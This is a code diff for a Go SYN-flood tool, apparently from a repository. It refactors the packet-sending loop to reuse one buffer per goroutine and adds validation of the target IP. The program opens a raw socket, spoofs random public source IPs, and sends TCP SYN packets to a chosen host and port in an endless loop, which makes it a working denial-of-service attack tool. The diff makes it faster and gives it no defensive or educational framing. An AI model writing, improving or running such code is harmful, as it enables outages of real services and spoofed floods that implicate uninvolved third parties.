@@ -5,18 +5,12 @@ import (
 	"flag"
 	"fmt"
 	"log"
-	"math/rand"
 	"net"
 	"os"
 	"os/signal"
 	"sync"
 	"syscall"
-	"time"
 )
-
-func init() {
-	rand.Seed(time.Now().UnixNano())
-}
 
 func main() {
 
@@ -30,6 +24,9 @@ func main() {
 	}
 
 	dstIp := net.ParseIP(*host)
+	if dstIp == nil {
+		log.Fatalf("invalid host: %s", *host)
+	}
 	dstPort := uint16(*port)
 	log.Printf("starting syn-flood against %s:%d", dstIp, dstPort)
 
@@ -37,10 +34,11 @@ func main() {
 	if err != nil {
 		log.Fatalf("new raw socket: %v", err)
 	}
+	defer rawSocket.Close()
 
 	wg := &sync.WaitGroup{}
 	ctx, cancelFunc := context.WithCancel(context.Background())
-	for i := 0; i < 2; i++ {
+	for i := range 2 {
 		wg.Add(1)
 		go Run(wg, ctx, rawSocket, dstIp, dstPort)
 		log.Printf("started go routine %d", i)
@@ -58,6 +56,7 @@ func main() {
 
 func Run(wg *sync.WaitGroup, ctx context.Context, rawSocket RawSocket, dstIp net.IP, dstPort uint16) {
 
+	packet := make([]byte, IPV4HeaderLen+TCPSYNHeaderLen)
 	for {
 		select {
 		case <-ctx.Done():
@@ -65,27 +64,23 @@ func Run(wg *sync.WaitGroup, ctx context.Context, rawSocket RawSocket, dstIp net
 			wg.Done()
 			return
 		default:
-			if err := SendSYN(rawSocket, dstIp, dstPort); err != nil {
+			if err := SendSYN(rawSocket, packet, dstIp, dstPort); err != nil {
 				log.Printf("send SYN: %v", err)
 			}
 		}
 	}
 }
 
-func SendSYN(rawSocket RawSocket, dstIp net.IP, dstPort uint16) error {
+func SendSYN(rawSocket RawSocket, packet []byte, dstIp net.IP, dstPort uint16) error {
 
 	srcIp := GetRandPublicIP()
-	tcpHeaderBytes, err := GetTCPSYNHeaderBytes(srcIp, dstIp, dstPort)
-	if err != nil {
-		return fmt.Errorf("get TCP header: %w", err)
+
+	if err := WriteTCPSYNHeader(packet[IPV4HeaderLen:], srcIp, dstIp, dstPort); err != nil {
+		return fmt.Errorf("write TCP header: %w", err)
 	}
+	WriteIPV4Header(packet, srcIp, dstIp, len(packet))
 
-	ipv4Header := GetIPV4Header(srcIp, dstIp, len(tcpHeaderBytes), syscall.IPPROTO_TCP)
-	ipv4HeaderBytes, _ := ipv4Header.Marshal()
-
-	data := append(ipv4HeaderBytes, tcpHeaderBytes...)
-
-	if err := rawSocket.Send(data); err != nil {
+	if err := rawSocket.Send(packet); err != nil {
 		return fmt.Errorf("send data to: %w", err)
 	}
 	return nil
